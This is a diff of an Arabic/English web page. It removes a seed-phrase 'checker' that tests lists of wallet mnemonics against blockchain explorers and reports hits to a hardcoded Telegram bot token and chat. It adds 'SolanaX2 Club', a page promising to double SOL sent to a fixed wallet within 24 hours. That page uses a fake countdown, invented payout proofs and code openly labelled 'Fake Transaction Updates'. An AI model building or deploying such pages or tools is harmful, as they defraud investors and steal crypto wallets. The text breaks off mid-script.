@@ -1,371 +1,748 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فاحص عبارات Mnemonic</title>
-    <!-- External Libraries -->
-    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script> <!-- BIP39 checksum & seed derivation -->
-    <script src="https://cdn.jsdelivr.net/npm/hdkey@1.1.1/dist/hdkey.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ethereumjs-util@7.1.3/dist/index.umd.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs.min.js"></script>
-    <style>
-        /* “Evil Hacker” CSS */
-        body {
-            background-color: #000;
-            color: #33ff33;
-            font-family: 'Source Code Pro', monospace;
-            text-shadow: 0 0 8px rgba(51, 255, 51, 0.7); /* Glow effect */
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-            margin: 0;
-            min-height: 100vh; /* Ensure it takes full viewport height */
-            box-sizing: border-box; /* Include padding in element's total width and height */
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title data-lang-key="page-title">SolanaX2 | ضاعف استثمارك مع سولانا</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;400&family=Inter:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Cairo', 'Inter', sans-serif; /* Added Inter for English text */
+      background: linear-gradient(120deg,#0f2133 0%, #5027c2 100%);
+      margin: 0;
+      color: #fff;
+      padding-top: 50px; /* Space for the fixed countdown bar */
+    }
+    header {
+      padding: 24px 0 16px 0;
+      text-align: center;
+      position: relative; /* To position language toggle */
+    }
+    h1 {
+      font-size: 2.5rem;
+      font-weight: 700;
+      margin-bottom: 10px;
+      letter-spacing: 1px;
+    }
+    .subtitle {
+      font-size: 1.3rem;
+      margin-bottom: 28px;
+    }
+    .main-box {
+      background: rgba(25,29,50,0.93);
+      margin: 0 auto 32px auto;
+      border-radius: 20px;
+      max-width: 480px;
+      padding: 36px 30px 24px 30px;
+      box-shadow: 0 8px 32px 0 rgba(44,0,90,0.16);
+    }
+    .calc-label {
+      font-size:1.1rem;
+      margin-bottom: 4px;
+    }
+    .input-group {
+      margin-bottom: 22px;
+    }
+    input[type="number"] {
+      width: 80%;
+      padding: 10px;
+      border-radius: 12px;
+      border: none;
+      font-size: 1.1rem;
+      margin-top: 6px;
+      text-align: center;
+      background-color: #1a1e38; /* Darker input background */
+      color: #fff;
+    }
+    .result-box {
+      background: #171d38;
+      border-radius: 12px;
+      margin: 16px auto 20px auto;
+      width: 94%;
+      padding: 18px 0;
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: #72ff9b;
+      box-shadow: 0 2px 8px 0 #5027c241;
+      text-align:center;
+    }
+    .invest-btn {
+      width: 100%;
+      padding: 14px 0;
+      background: linear-gradient(90deg,#58e4a8,#5027c2);
+      color: #fff;
+      border:none;
+      border-radius: 12px;
+      font-size: 1.2rem;
+      font-weight:700;
+      cursor:pointer;
+      transition: opacity 0.2s;
+    }
+    .invest-btn:active {
+      opacity:0.8;
+    }
+    .howto, .proofs, .about, .faq, .contact {
+      background:rgba(255,255,255,0.08);
+      border-radius:18px;
+      margin:30px auto 0 auto;
+      max-width: 540px;
+      padding: 22px 24px 20px 24px;
+      box-shadow:0 2px 12px 0 #5027c230;
+    }
+    .section-title {
+      font-size:1.35rem;
+      font-weight:700;
+      margin-bottom: 13px;
+    }
+    .howto-steps {
+      padding:0;
+      margin:0 0 0 12px; /* Adjusted for RTL/LTR consistency */
+    }
+    html[dir="ltr"] .howto-steps {
+        padding-left: 20px; /* Standard bullet points for LTR */
+        margin-left: 0;
+    }
+    html[dir="rtl"] .howto-steps {
+        padding-right: 20px; /* Standard bullet points for RTL */
+        margin-right: 0;
+    }
 
-        h2 {
-            color: #33ff33;
-            text-shadow: 0 0 10px rgba(51, 255, 51, 0.9);
-            margin-bottom: 20px;
-        }
+    .howto-steps li {
+      margin-bottom: 7px;
+      font-size:1.07rem;
+    }
+    .wallet-section {
+      margin: 26px auto 0 auto;
+      text-align: center;
+    }
+    .wallet-box {
+      background:#1b223b;
+      padding:18px 12px;
+      border-radius:13px;
+      margin-bottom:12px;
+      word-break:break-all;
+    }
+    .qrcode-img {
+      margin:14px auto 12px auto;
+    }
+    .proofs-list {
+      display:flex;
+      flex-direction:column;
+      gap:8px;
+      margin-top:10px;
+    }
+    .proof-card {
+      background: #10172a;
+      padding:10px 15px;
+      border-radius:9px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size:0.97rem;
+      border:1px solid #37218120;
+    }
+    .proof-amount {
+      color:#63ffaf;
+      font-weight:700;
+    }
+    .proof-wallet {
+      color:#f2d084;
+      font-family:monospace;
+    }
+    .faq-item {
+      margin-bottom:12px;
+    }
+    .faq-q {
+      font-weight:700;
+      margin-bottom:3px;
+    }
+    a, .contact-link {
+      color:#a0c4ff;
+      text-decoration: none; /* Remove underline */
+    }
+    a:hover, .contact-link:hover {
+      text-decoration: underline; /* Add underline on hover */
+    }
+    /* Custom message box styles */
+    .message-box-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.7);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+    }
+    .message-box {
+        background-color: #2a2f4c;
+        color: #fff;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        text-align: center;
+        max-width: 300px;
+        font-family: 'Cairo', 'Inter', sans-serif;
+    }
+    .message-box button {
+        background-color: #5027c2;
+        color: #fff;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 1rem;
+        margin-top: 15px;
+        transition: background-color 0.2s;
+    }
+    .message-box button:hover {
+        background-color: #6a40d6;
+    }
 
-        input[type="file"],
-        input[type="text"],
-        button {
-            background-color: #111;
-            color: #33ff33;
-            border: 2px solid #33ff33;
-            padding: 10px 15px;
-            margin: 8px 0;
-            border-radius: 5px;
-            font-family: 'Source Code Pro', monospace;
-            font-size: 1em;
-            box-shadow: 0 0 5px rgba(51, 255, 51, 0.5);
-            transition: background-color 0.3s ease, box-shadow 0.3s ease;
-            width: 100%; /* Make inputs responsive */
-            max-width: 500px; /* Limit max width */
-        }
+    /* Language Switcher */
+    .language-switcher {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      display: flex;
+      gap: 10px;
+    }
+    .language-switcher button {
+      background: #1b223b;
+      color: #fff;
+      border: 1px solid #5027c2;
+      padding: 8px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      transition: background-color 0.2s, border-color 0.2s;
+    }
+    .language-switcher button.active,
+    .language-switcher button:hover {
+      background: #5027c2;
+      border-color: #58e4a8;
+    }
+    html[dir="rtl"] .language-switcher {
+      right: initial;
+      left: 15px;
+    }
 
-        input[type="file"]::file-selector-button {
-            background-color: #33ff33;
-            color: #000;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 3px;
-            font-family: 'Source Code Pro', monospace;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
+    /* Countdown Bar (general style) */
+    .countdown-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background-color: #10172a;
+      padding: 10px 0;
+      text-align: center;
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: #f0b74a;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+      z-index: 999; /* Below message box, above other content */
+      display: none; /* Hidden by default for both, will be shown by JS */
+    }
 
-        input[type="file"]::file-selector-button:hover {
-            background-color: #22ee22;
-        }
-
-        input[type="text"]::placeholder {
-            color: #55aa55;
-        }
-
-        input[type="text"]:focus,
-        button:focus {
-            outline: none;
-            box-shadow: 0 0 10px rgba(51, 255, 51, 0.8);
-        }
-
-        button {
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        button:hover {
-            background-color: #222;
-            box-shadow: 0 0 15px rgba(51, 255, 51, 0.9);
-        }
-
-        #summary {
-            margin-top: 20px;
-            font-size: 1.1em;
-            text-align: center;
-            width: 100%;
-            max-width: 600px;
-        }
-
-        #summary .count {
-            color: #00ff00;
-            font-weight: bold;
-            text-shadow: 0 0 5px rgba(0, 255, 0, 0.7);
-        }
-
-        #results {
-            background-color: #111;
-            border: 2px solid #33ff33;
-            border-radius: 8px;
-            padding: 15px;
-            margin-top: 20px;
-            width: 90%; /* Responsive width */
-            max-width: 800px;
-            height: 400px; /* Fixed height for scrollability */
-            overflow-y: scroll;
-            font-family: 'Source Code Pro', monospace;
-            font-size: 0.9em;
-            box-shadow: 0 0 10px rgba(51, 255, 51, 0.6);
-            white-space: pre-wrap; /* Preserve whitespace and wrap text */
-            word-wrap: break-word; /* Break long words */
-            scrollbar-width: thin; /* Firefox */
-            scrollbar-color: #33ff33 #111; /* Firefox */
-        }
-
-        #results::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        #results::-webkit-scrollbar-track {
-            background: #111;
-            border-radius: 10px;
-        }
-
-        #results::-webkit-scrollbar-thumb {
-            background-color: #33ff33;
-            border-radius: 10px;
-            border: 2px solid #111;
-        }
-
-        #results div {
-            padding: 5px 0;
-            border-bottom: 1px dashed #222;
-        }
-
-        #results div:last-child {
-            border-bottom: none;
-        }
-
-        .good {
-            color: #00ff00; /* Bright green for success */
-        }
-
-        .bad {
-            color: #ff3333; /* Red for failure */
-        }
-
-        .limit {
-            color: #ffff33; /* Yellow for rate limit */
-            font-weight: bold;
-            text-shadow: 0 0 5px rgba(255, 255, 51, 0.7);
-        }
-
-        /* Responsive adjustments */
-        @media (max-width: 600px) {
-            body {
-                padding: 10px;
-            }
-
-            h2 {
-                font-size: 1.5em;
-            }
-
-            input[type="file"],
-            input[type="text"],
-            button {
-                font-size: 0.9em;
-                padding: 8px 12px;
-            }
-
-            #results {
-                font-size: 0.8em;
-                padding: 10px;
-                height: 300px;
-            }
-        }
-    </style>
+    footer {
+      text-align:center;
+      color:#b2b2c5;
+      margin:24px 0 8px 0;
+      font-size:0.98rem;
+    }
+    @media (max-width:600px){
+      body {
+        padding-top: 60px; /* Adjust padding for smaller screens */
+      }
+      .main-box,.howto,.about,.faq,.contact,.proofs {padding:14px 9px;}
+      .main-box,.howto,.about,.faq,.contact,.proofs {max-width:98%;}
+      h1 {font-size:2rem;}
+      .language-switcher {
+        top: 10px;
+        right: 10px;
+      }
+      html[dir="rtl"] .language-switcher {
+        left: 10px;
+        right: initial;
+      }
+      .countdown-bar {
+        font-size: 1rem;
+        padding: 12px 0;
+      }
+    }
+  </style>
 </head>
 <body>
-    <!-- HTML Body Structure -->
-    <h2>فاحص عبارات Mnemonic لجميع العملات</h2>
-    <input type="file" id="fileInput" accept=".txt"> <!-- upload a .txt file with one 12-word phrase per line -->
-    <input type="text" id="etherscanKey" placeholder="Etherscan API Key"> <!-- optional, leave blank to skip ETH -->
-    <input type="text" id="bscscanKey" placeholder="BscScan API Key"> <!-- optional, skip BSC if blank -->
-    <input type="text" id="polygonKey" placeholder="Polygonscan API Key"> <!-- optional, skip Polygon if blank -->
-    <input type="text" id="snowtraceKey" placeholder="Snowtrace API Key"> <!-- optional, skip Avalanche if blank -->
-    <button onclick="scanFile()">فحص العبارات</button>
-    <audio id="gunshot" src="gunshot.mp3" preload="auto"></audio> <!-- gunshot sound file must be in same folder -->
-    <div id="summary">لم يتم الفحص بعد.</div> <!-- shows “scanned X/Y” and counts -->
-    <div id="results"></div> <!-- lists each phrase as ✅ or ❌ or rate-limit ⚠️ -->
+<!-- The 2-hour offer countdown bar (visible by default as per original intent) -->
+<div id="countdown-bar-offer" class="countdown-bar" style="display:block;"></div>
 
-    <script>
-        // Telegram Alert Configuration
-        const TELEGRAM_BOT_TOKEN = '8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU';
-        const TELEGRAM_CHAT_ID = '-4913064483';
-        async function sendTelegramAlert(text) {
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`)
-            .catch(e => console.error('Telegram alert failed', e));
+<!-- The 24-hour investment processing countdown bar (initially hidden) -->
+<div id="countdown-bar-investment" class="countdown-bar" style="display:none;"></div>
+
+<header>
+  <div class="language-switcher">
+    <button data-lang="ar" onclick="setLanguage('ar')">العربية</button>
+    <button data-lang="en" onclick="setLanguage('en')">English</button>
+  </div>
+  <!-- Updated Solana Logo -->
+  <img src="https://i.postimg.cc/4dt1VFFW/images-2025-06-30-T060113-134.jpg" alt="Solana Logo" width="60" style="border-radius:20px;box-shadow:0 2px 6px #5027c266;">
+  <h1 data-lang-key="heading-title">SolanaX2 Club</h1>
+  <div class="subtitle" data-lang-key="subtitle">ضاعف استثمارك مع سولانا خلال 24 ساعة فقط<br>استثمر بأمان في شبكة سولانا وكن جزءًا من المستقبل!</div>
+</header>
+
+<div class="main-box">
+  <div class="calc-label" data-lang-key="invest-amount-label">أدخل المبلغ المراد استثماره (SOL):</div>
+  <div class="input-group">
+    <input id="sol-amount" type="number" min="1" max="100000" step="0.01" placeholder="مثال: 1200" oninput="updateProfit()">
+  </div>
+  <div class="result-box" id="result-box">
+    <span data-lang-key="profit-message-part1">ستحصل على</span> <span id="profit">0</span> SOL <span data-lang-key="profit-message-part2">بعد 24 ساعة</span>
+  </div>
+  <button class="invest-btn" onclick="showWallet()" data-lang-key="invest-button">ابدأ الاستثمار الآن</button>
+</div>
+
+<div class="wallet-section" id="wallet-section" style="display:none;">
+  <div class="wallet-box">
+    <b data-lang-key="wallet-address-label">عنوان محفظة سولانا:</b>
+    <!-- Updated Solana Wallet Address -->
+    <div id="wallet-address" style="font-size:1.1rem;direction:ltr;text-align:center;margin:5px 0;">Eaznz3xhDmmyRYU6ZkfFjzrXyEVph7K1ghZWFjGaZEYe</div>
+  </div>
+  <!-- Updated QR Code image based on new wallet address -->
+  <img src="https://api.qrserver.com/v1/create-qr-code/?data=Eaznz3xhDmmyRYU6ZkfFjzrXyEVph7K1ghZWFjGaZEYe&size=120x120" class="qrcode-img" width="120" height="120" alt="Solana QR Code">
+  <div style="color:#b9e5fb;margin:7px 0 0 0;font-size:1.04rem;" data-lang-key="wallet-instructions">أرسل المبلغ إلى العنوان أعلاه، ثم انتظر تأكيد الاستثمار وبداية العداد!</div>
+</div>
+
+<div class="howto">
+  <div class="section-title" data-lang-key="howto-title">كيف يعمل النظام؟</div>
+  <ul class="howto-steps">
+    <li data-lang-key="howto-step1">أدخل المبلغ المراد استثماره (الحد الأدنى 1 SOL أو ما يعادله بالدولار).</li>
+    <li data-lang-key="howto-step2">انقر على "ابدأ الاستثمار الآن".</li>
+    <li data-lang-key="howto-step3">أرسل المبلغ إلى عنوان محفظة سولانا الظاهر.</li>
+    <li data-lang-key="howto-step4">انتظر 24 ساعة ليتم معالجة الاستثمار عبر النظام الذكي.</li>
+    <li data-lang-key="howto-step5">ستحصل على ضعف المبلغ تلقائيًا في محفظتك بعد انتهاء العداد.</li>
+  </ul>
+</div>
+
+<div class="proofs">
+  <div class="section-title" data-lang-key="proofs-title">آخر إثباتات دفع للمستثمرين</div>
+  <div class="proofs-list" id="proofs-list">
+    <!-- Initial transactions (will be replaced by dynamic injection) -->
+    <div class="proof-card">
+      <span class="proof-amount">+2400 SOL</span>
+      <span class="proof-wallet">...q2afJ4kZs</span>
+      <span data-lang-key="time-ago1">قبل 10 دقائق</span>
+    </div>
+    <div class="proof-card">
+      <span class="proof-amount">+3300 SOL</span>
+      <span class="proof-wallet">...QPw6pRvma</span>
+      <span data-lang-key="time-ago2">قبل 23 دقيقة</span>
+    </div>
+    <div class="proof-card">
+      <span class="proof-amount">+10000 SOL</span>
+      <span class="proof-wallet">...W1erG7hs</span>
+      <span data-lang-key="time-ago3">قبل ساعة</span>
+    </div>
+  </div>
+</div>
+
+<div class="about">
+  <div class="section-title" data-lang-key="about-title">من نحن</div>
+  <span data-lang-key="about-content">نحن فريق من رواد تقنية البلوكتشين، نؤمن بقوة سولانا ونسعى لدعم الشبكة من خلال حلول استثمارية مبتكرة وشفافة وسريعة. جميع العمليات تتم عبر العقود الذكية لضمان أمان المستخدم وسرعة المعاملات. استثمر وكن جزءًا من ثورة سولانا.</span>
+</div>
+
+<div class="faq">
+  <div class="section-title" data-lang-key="faq-title">الأسئلة الشائعة</div>
+  <div class="faq-item">
+    <div class="faq-q" data-lang-key="faq-q1">هل الأرباح مضمونة؟</div>
+    <div class="faq-a" data-lang-key="faq-a1">جميع العمليات تعتمد على تقنيات العقود الذكية وشبكة سولانا. هناك مخاطرة في كل استثمار، وننصحك بعدم استثمار أكثر مما يمكنك تحمل خسارته.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-q" data-lang-key="faq-q2">كيف أستلم أرباحي؟</div>
+    <div class="faq-a" data-lang-key="faq-a2">بعد مرور 24 ساعة من الاستثمار، يتم إرسال أرباحك مباشرة إلى نفس المحفظة التي حولت منها.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-q" data-lang-key="faq-q3">هل أحتاج إلى تسجيل حساب؟</div>
+    <div class="faq-a" data-lang-key="faq-a3">لا، لا تحتاج لأي تسجيل أو تقديم بيانات شخصية. كل شيء يتم عبر محفظتك على سولانا فقط.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-q" data-lang-key="faq-q4">هل المنصة رسمية؟</div>
+    <div class="faq-a" data-lang-key="faq-a4">المنصة مجتمعية تهدف لدعم سولانا. لسنا جهة مصرفية أو مؤسسة مالية رسمية. نحن نعمل بفضل ثقة مجتمعنا فقط.</div>
+  </div>
+</div>
+
+<div class="contact">
+  <div class="section-title" data-lang-key="contact-title">تواصل معنا</div>
+  <span data-lang-key="contact-instructions">للدعم الفوري أو الاستفسارات، تواصل معنا عبر تيليجرام:</span>  
+  <a class="contact-link" href="https://t.me/SolanaX2_Support" target="_blank">@SolanaX2_Support</a>
+  <br><br>
+  <span data-lang-key="contact-email-label">أو عبر البريد الإلكتروني:</span> support@solanax2.club
+</div>
+
+<footer>
+  <span data-lang-key="footer-rights">جميع الحقوق محفوظة &copy; SolanaX2 Club 2025</span><br>
+  <span style="font-size:0.91rem;" data-lang-key="footer-disclaimer">استثمر بحكمة. هذه المنصة غير خاضعة لرقابة حكومية.</span>
+</footer>
+
+<script>
+  // Translations object containing all Arabic and English texts
+  const translations = {
+    'ar': {
+      'page-title': 'SolanaX2 | ضاعف استثمارك مع سولانا',
+      'heading-title': 'SolanaX2 Club',
+      'subtitle': 'ضاعف استثمارك مع سولانا خلال 24 ساعة فقط<br>استثمر بأمان في شبكة سولانا وكن جزءًا من المستقبل!',
+      'invest-amount-label': 'أدخل المبلغ المراد استثماره (SOL):',
+      'profit-message-part1': 'ستحصل على',
+      'profit-message-part2': 'بعد 24 ساعة',
+      'invest-button': 'ابدأ الاستثمار الآن',
+      'wallet-address-label': 'عنوان محفظة سولانا:',
+      'wallet-instructions': 'أرسل المبلغ إلى العنوان أعلاه، ثم انتظر تأكيد الاستثمار وبداية العداد!',
+      'howto-title': 'كيف يعمل النظام؟',
+      'howto-step1': 'أدخل المبلغ المراد استثماره (الحد الأدنى 1 SOL أو ما يعادله بالدولار).',
+      'howto-step2': 'انقر على "ابدأ الاستثمار الآن".',
+      'howto-step3': 'أرسل المبلغ إلى عنوان محفظة سولانا الظاهر.',
+      'howto-step4': 'انتظر 24 ساعة ليتم معالجة الاستثمار عبر النظام الذكي.',
+      'howto-step5': 'ستحصل على ضعف المبلغ تلقائيًا في محفظتك بعد انتهاء العداد.',
+      'proofs-title': 'آخر إثباتات دفع للمستثمرين',
+      'time-ago1': 'قبل 10 دقائق',
+      'time-ago2': 'قبل 23 دقيقة',
+      'time-ago3': 'قبل ساعة',
+      'about-title': 'من نحن',
+      'about-content': 'نحن فريق من رواد تقنية البلوكتشين، نؤمن بقوة سولانا ونسعى لدعم الشبكة من خلال حلول استثمارية مبتكرة وشفافة وسريعة. جميع العمليات تتم عبر العقود الذكية لضمان أمان المستخدم وسرعة المعاملات. استثمر وكن جزءًا من ثورة سولانا.',
+      'faq-title': 'الأسئلة الشائعة',
+      'faq-q1': 'هل الأرباح مضمونة؟',
+      'faq-a1': 'جميع العمليات تعتمد على تقنيات العقود الذكية وشبكة سولانا. هناك مخاطرة في كل استثمار، وننصحك بعدم استثمار أكثر مما يمكنك تحمل خسارته.',
+      'faq-q2': 'كيف أستلم أرباحي؟',
+      'faq-a2': 'بعد مرور 24 ساعة من الاستثمار، يتم إرسال أرباحك مباشرة إلى نفس المحفظة التي حولت منها.',
+      'faq-q3': 'هل أحتاج إلى تسجيل حساب؟',
+      'faq-a3': 'لا، لا تحتاج لأي تسجيل أو تقديم بيانات شخصية. كل شيء يتم عبر محفظتك على سولانا فقط.',
+      'faq-q4': 'هل المنصة رسمية؟',
+      'faq-a4': 'المنصة مجتمعية تهدف لدعم سولانا. لسنا جهة مصرفية أو مؤسسة مالية رسمية. نحن نعمل بفضل ثقة مجتمعنا فقط.',
+      'contact-title': 'تواصل معنا',
+      'contact-instructions': 'للدعم الفوري أو الاستفسارات، تواصل معنا عبر تيليجرام:',
+      'contact-email-label': 'أو عبر البريد الإلكتروني:',
+      'footer-rights': 'جميع الحقوق محفوظة &copy; SolanaX2 Club 2025',
+      'footer-disclaimer': 'استثمر بحكمة. هذه المنصة غير خاضعة لرقابة حكومية.',
+      'min-investment-alert': 'الحد الأدنى للاستثمار هو 1 SOL.'
+    },
+    'en': {
+      'page-title': 'SolanaX2 | Double Your Solana Investment',
+      'heading-title': 'SolanaX2 Club',
+      'subtitle': 'Double your Solana investment in just 24 hours<br>Invest securely in the Solana network and be part of the future!',
+      'invest-amount-label': 'Enter the amount to invest (SOL):',
+      'profit-message-part1': 'You will receive',
+      'profit-message-part2': 'after 24 hours',
+      'invest-button': 'Start Investing Now',
+      'wallet-address-label': 'Solana Wallet Address:',
+      'wallet-instructions': 'Send the amount to the address above, then wait for investment confirmation and countdown to begin!',
+      'howto-title': 'How It Works?',
+      'howto-step1': 'Enter the amount to invest (minimum 1 SOL or equivalent in USD).',
+      'howto-step2': 'Click "Start Investing Now".',
+      'howto-step3': 'Send the amount to the displayed Solana wallet address.',
+      'howto-step4': 'Wait 24 hours for the investment to be processed via the smart system.',
+      'howto-step5': 'You will automatically receive double the amount in your wallet after the countdown ends.',
+      'proofs-title': 'Latest Investor Payout Proofs',
+      'time-ago1': '10 minutes ago',
+      'time-ago2': '23 minutes ago',
+      'time-ago3': '1 hour ago',
+      'about-title': 'About Us',
+      'about-content': 'We are a team of blockchain pioneers who believe in the power of Solana and strive to support the network through innovative, transparent, and fast investment solutions. All operations are conducted via smart contracts to ensure user security and transaction speed. Invest and be part of the Solana revolution.',
+      'faq-title': 'Frequently Asked Questions',
+      'faq-q1': 'Are the profits guaranteed?',
+      'faq-a1': 'All operations rely on smart contract technologies and the Solana network. There is risk in every investment, and we advise you not to invest more than you can afford to lose.',
+      'faq-q2': 'How do I receive my profits?',
+      'faq-a2': 'After 24 hours of investment, your profits will be sent directly to the same wallet you transferred from.',
+      'faq-q3': 'Do I need to register an account?',
+      'faq-a3': 'No, you do not need any registration or personal data submission. Everything is done solely through your Solana wallet.',
+      'faq-q4': 'Is the platform official?',
+      'faq-a4': 'This is a community-driven platform aimed at supporting Solana. We are not a banking entity or official financial institution. We operate solely on the trust of our community.',
+      'contact-title': 'Contact Us',
+      'contact-instructions': 'For immediate support or inquiries, contact us via Telegram:',
+      'contact-email-label': 'Or via Email:',
+      'footer-rights': 'All rights reserved &copy; SolanaX2 Club 2025',
+      'footer-disclaimer': 'Invest wisely. This platform is not government-regulated.',
+      'min-investment-alert': 'Minimum investment is 1 SOL.'
+    }
+  };
+
+  let currentLanguage = localStorage.getItem('solanax2_lang') || 'ar'; // Default to Arabic
+
+  // Variables for the 24-hour investment countdown
+  let investmentTimerIntervalId;
+  let investmentRemainingTime = 0; // Will be set to 24 hours when timer starts.
+
+  // Variables for the 2-hour offer countdown
+  let offerTimerIntervalId;
+  let offerRemainingTime = 2 * 60 * 60; // 2 hours in seconds = 7200
+
+  // Function to set the website language and update all text content
+  function setLanguage(lang) {
+    currentLanguage = lang;
+    document.documentElement.lang = lang;
+    document.documentElement.dir = (lang === 'ar') ? 'rtl' : 'ltr';
+
+    // Update text content for all elements with data-lang-key
+    document.querySelectorAll('[data-lang-key]').forEach(element => {
+      const key = element.getAttribute('data-lang-key');
+      if (translations[lang] && translations[lang][key]) {
+        element.innerHTML = translations[lang][key];
+      }
+    });
+
+    // Update input placeholder for amount
+    const solAmountInput = document.getElementById('sol-amount');
+    if (solAmountInput) {
+      if (lang === 'ar') {
+        solAmountInput.placeholder = "مثال: 1200";
+      } else {
+        solAmountInput.placeholder = "Ex: 1200";
+      }
+    }
+
+    // Update active state of language buttons
+    document.querySelectorAll('.language-switcher button').forEach(button => {
+      if (button.getAttribute('data-lang') === lang) {
+        button.classList.add('active');
+      } else {
+        button.classList.remove('active');
+      }
+    });
+
+    localStorage.setItem('solanax2_lang', lang); // Save language preference to local storage
+    updateProfit(); // Re-calculate profit display in new language format
+
+    // Update both countdown displays immediately after language change if they are active
+    if (document.getElementById('countdown-bar-offer').style.display === 'block') {
+        updateOfferTimerDisplay();
+    }
+    if (document.getElementById('countdown-bar-investment').style.display === 'block') {
+        updateInvestmentTimerDisplay();
+    }
+  }
+
+  // Function to update the calculated profit display
+  function updateProfit() {
+    var amount = parseFloat(document.getElementById('sol-amount').value) || 0;
+    // Using en-US locale for number formatting to ensure consistent display across languages
+    document.getElementById('profit').innerText = (amount * 2).toLocaleString('en-US', {maximumFractionDigits:2});
+  }
+
+  // ======= 24-hour Investment Countdown Functions =======
+  // Function to start the 24-hour investment countdown timer
+  function startInvestmentTimer() {
+    investmentRemainingTime = 24 * 60 * 60; // 24 hours in seconds (86400 seconds)
+    const countdownBar = document.getElementById('countdown-bar-investment');
+    if (countdownBar) {
+        countdownBar.style.display = 'block'; // Make timer visible
+    }
+
+    // Clear any existing interval to prevent multiple timers for investment
+    if (investmentTimerIntervalId) {
+      clearInterval(investmentTimerIntervalId);
+    }
+
+    // Update timer display immediately and then every second
+    updateInvestmentTimerDisplay();
+    investmentTimerIntervalId = setInterval(investmentCountdownTick, 1000);
+  }
+
+  // Function to update the 24-hour investment countdown display
+  function updateInvestmentTimerDisplay() {
+    const hours = Math.floor(investmentRemainingTime / 3600);
+    const minutes = Math.floor((investmentRemainingTime % 3600) / 60);
+    const seconds = investmentRemainingTime % 60;
+
+    const formattedTime = [
+      hours.toString().padStart(2, '0'),
+      minutes.toString().padStart(2, '0'),
+      seconds.toString().padStart(2, '0')
+    ].join(':');
+
+    const timerText = currentLanguage === 'ar' ? `الوقت المتبقي لمعالجة الاستثمار: ${formattedTime}` : `Time remaining for investment processing: ${formattedTime}`;
+    const countdownBar = document.getElementById('countdown-bar-investment');
+    if (countdownBar) {
+        countdownBar.innerText = timerText;
+    }
+
+    if (investmentRemainingTime <= 0) {
+      clearInterval(investmentTimerIntervalId);
+      if (countdownBar) {
+        countdownBar.innerText = currentLanguage === 'ar' ? 'انتهى وقت المعالجة!' : 'Processing time ended!';
+      }
+      // Optionally hide the wallet section or show a completion message
+      // document.getElementById('wallet-section').style.display = 'none';
+    }
+  }
+
+  // Function called every second by setInterval for investment timer
+  function investmentCountdownTick() {
+    investmentRemainingTime--;
+    if (investmentRemainingTime < 0) { // Ensure it doesn't go negative
+        investmentRemainingTime = 0;
+    }
+    updateInvestmentTimerDisplay();
+  }
+
+
+  // ======= 2-hour Offer Countdown Functions =======
+  // Function to start the 2-hour exclusive offer timer
+  function startOfferTimer() {
+    offerRemainingTime = 2 * 60 * 60; // 2 hours in seconds = 7200
+    const countdownBarOffer = document.getElementById('countdown-bar-offer');
+    if (countdownBarOffer) {
+        countdownBarOffer.style.display = 'block';
+    }
+
+    // Clear any existing interval to prevent multiple timers for offer
+    if (offerTimerIntervalId) clearInterval(offerTimerIntervalId);
+    updateOfferTimerDisplay();
+    offerTimerIntervalId = setInterval(offerCountdownTick, 1000);
+  }
+
+  // Function to update the 2-hour offer countdown display
+  function updateOfferTimerDisplay() {
+    const hours = Math.floor(offerRemainingTime / 3600);
+    const minutes = Math.floor((offerRemainingTime % 3600) / 60);
+    const seconds = offerRemainingTime % 60;
+    const formattedTime = [
+      hours.toString().padStart(2, '0'),
+      minutes.toString().padStart(2, '0'),
+      seconds.toString().padStart(2, '0')
+    ].join(':');
+
+    // Text for exclusive offer countdown
+    const timerText = (currentLanguage === 'ar')
+      ? `⏰ تبقت ${formattedTime} على انتهاء العرض الحصري!`
+      : `⏰ Only ${formattedTime} left for this exclusive offer!`;
+    
+    const countdownBarOffer = document.getElementById('countdown-bar-offer');
+    if (countdownBarOffer) {
+        countdownBarOffer.innerText = timerText;
+    }
+
+    if (offerRemainingTime <= 0) {
+      clearInterval(offerTimerIntervalId);
+      if (countdownBarOffer) {
+        countdownBarOffer.innerText =
+          (currentLanguage === 'ar')
+            ? 'انتهى العرض! يرجى إعادة تحميل الصفحة للعروض الجديدة.'
+            : 'Offer ended! Please reload for new offers.';
+      }
+    }
+  }
+
+  // Function called every second by setInterval for offer timer
+  function offerCountdownTick() {
+    offerRemainingTime--;
+    if (offerRemainingTime < 0) offerRemainingTime = 0;
+    updateOfferTimerDisplay();
+  }
+
+
+  // ========== Automatic Fake Transaction Updates ==========
+  // Generates a random short wallet address snippet
